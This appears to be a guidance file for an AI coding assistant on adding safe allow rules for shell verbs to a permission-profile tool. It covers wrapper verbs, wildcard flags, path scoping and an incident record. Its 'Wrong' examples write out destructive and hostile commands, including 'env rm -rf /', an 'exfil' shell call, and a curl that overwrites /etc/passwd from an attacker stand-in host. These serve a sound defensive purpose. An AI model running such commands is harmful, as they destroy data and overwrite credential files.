When a user asks to add a verb to a profile with `decision: approved`, work through these checks before writing the YAML. Most mistakes happen when a rule is added quickly without asking "what does this actually let through?"

---

## Verb tiers

Every verb falls into one of four tiers. The tier determines what safety evaluation is required.

| Tier | Description | Examples |
|---|---|---|
| **Wrapper verbs** | Execute an arbitrary second command; approving them with `flags: "*"` is approving everything they can wrap. | `env`, `xargs`, `sudo`, `su`, `time`, `timeout`, `ionice`, `nice`, `nohup`, `setsid`, `strace`, `ltrace`, `nsenter`, `unshare`, `firejail`, `doas` |
| **Mutating verbs** | Permanently change or delete files; need a `path_spec` to constrain blast radius. | `rm`, `chmod`, `cp`, `mv`, `tee`, `dd`, `install`, `ln`, `truncate`, `shred`, `rsync`, `chown`, `chgrp`, `mkfs` |
| **Read-only verbs** | Safe globally with no `path_spec`. | `stat`, `find` (without `-delete`), `head`, `tail`, `man`, `curl` (without `-o`) |
| **Orchestration verbs** | Always allowed — no rule needed. | *(handled automatically)* |

Identify the tier first. The tier tells you which of the checks below apply.

---

<a id="transparent-wrappers"></a>
## 1. Is the verb a transparent wrapper?

**Transparent wrappers** execute an arbitrary second command. Approving them with `flags: "*"` is equivalent to approving every verb they can wrap.

Known wrappers: `env`, `xargs`, `sudo`, `su`, `time`, `timeout`, `ionice`, `nice`, `nohup`, `setsid`, `strace`, `ltrace`, `nsenter`, `unshare`, `firejail`, `doas`

**What to check:**
- Is it in the list above, or does it clearly take a command as an argument?
- If yes: do NOT add `flags: "*"` without a `subcommand` or `path_spec` constraint.

**Safe forms only:**
- `flags: []` — the bare invocation (e.g. `env` prints the environment; read-only)
- `flags: ["-u"]` on `env` — unsetting a variable, no subprocess
- `subcommand: <specific-verb>` if `verb_types: task_runner` is set — but verify no existing `rule_shapes` rows use `subcommand: null` for this verb first (adding `task_runner` silently breaks them)

**Wrong:** `verb: env, flags: "*"` — approves `env rm -rf /`, `env bash -c 'exfil'`
**Right:** drop the rule; the user cares about the wrapped verb, not `env`

---

<a id="wildcard-dangerous-flags"></a>
## 2. Can `flags: "*"` hide a destructive flag?

Even for non-wrappers, `flags: "*"` covers flags that change the verb's safety category entirely.

Ask: **does this verb have flags that make it dangerous?**

Examples:
- `curl -o /path` — writes to disk; `curl flags: "*"` approves file writes
- `find -delete` — deletes files; `find flags: "*"` approves deletion
- `chmod -R 777` — recursive permission change; `chmod flags: "*"` is broad
- `rm flags: "*"` globally (no `path_spec`) — approves deletion anywhere

**What to do:**
- Enumerate the dangerous flags. If a `path_spec` (e.g. `$TRUSTED_DIR/**`) constrains the blast radius to acceptable scope, `flags: "*"` is fine.
- If there is no `path_spec` and the verb can write/delete/execute, list the safe flags explicitly instead of wildcarding.

**Wrong:** `verb: curl, flags: "*"` — approves `curl -o /etc/passwd https://evil.example/`
**Right:** `verb: curl, flags: "*", path_spec: "$PROJECT_ROOT/**"` — constrained to the project tree

---

<a id="blast-radius"></a>
## 3. What is the blast radius without a `path_spec`?

A rule with no `path_spec` is global — it matches regardless of which file the command operates on.

**Read-only verbs** (safe globally): `stat`, `find`, `head`, `tail`, `man`, `curl` (no `-o`), `wget --spider`, `sqlite3` (query mode)

**Write/delete/execute verbs** (need `path_spec`): `rm`, `chmod`, `cp`, `mv`, `tee`, `dd`, `install`, `make` (full build)

**Rule of thumb:** if the verb can permanently change or delete files, require a `path_spec`. Use `$TRUSTED_DIR/**`, `$JUNK_DIR/**`, or `$PROJECT_ROOT/**`. Never use a global wildcard on a mutating verb.

**Wrong:** `verb: rm, flags: ["-rf"]` with no `path_spec` — matches any path on disk
**Right:** `verb: rm, flags: ["-rf"], path_spec: "$JUNK_DIR/**"` — scoped to the disposable directory

---

<a id="redundant-rules"></a>
## 4. Does a safer form already exist?

Check `safe_shapes.yaml` and the other bundled profiles before adding anything.

```bash
grep -r "verb: <X>" src/nephoscope/learners/permission/config/fixtures/
```

If a rule already exists with narrower scope, do not add a broader one to dev-tools.

**Wrong:** adding `verb: stat, flags: "*"` to dev-tools when `safe_shapes.yaml` already has `verb: stat, flags: []`
**Right:** skip the addition; the existing rule already covers it

---

<a id="organic-learning"></a>
## 5. Should this be learned organically instead?

Nephoscope learns permission shapes from real session usage. A rule that covers one specific invocation pattern is better learned than guessed.

Ask: **is the user describing a specific command they ran, or a general category?**

- Specific (`uv run pytest -q`) → let nephoscope learn it; propose the candidate
- General category (`stat anything`, `find anything`) → a profile rule is appropriate

When in doubt, do not add the profile rule. The candidate surfaced from real usage will be more precise.

**Wrong:** adding `verb: uv, subcommand: run, flags: "*"` because the user often runs `uv run pytest`
**Right:** let the session generate a candidate; propose it via the candidate flow

---

## 6. Quick checklist

Before writing the YAML:

- [ ] Is this verb a transparent wrapper? If yes, no `flags: "*"`
- [ ] Does `flags: "*"` hide a dangerous flag (delete, write, execute)? If yes, add `path_spec` or enumerate safe flags
- [ ] Mutating verb with no `path_spec`? Reject unless read-only
- [ ] Already covered by `safe_shapes.yaml` or another profile? Skip
- [ ] Is the user describing a specific invocation that should be learned, not guessed? Suggest the candidate flow instead

---

## See also

Available CLI commands for inspecting and auditing rules:

- `nephoscope-permissions status` — shows current rules summary

---

## Incident record

**2026-05-01 — `env flags:"*"` in dev-tools.yaml (dropped)**
Added during a session that was expanding dev-tools with stat/find/tail/head. Passed initial review because the immediate context was "safe read-only tools." Caught by code review at commit time. Root cause: `env` looks benign in isolation; the transparent-wrapper risk is non-obvious without explicitly asking "what does `flags:*` on this verb approve?"
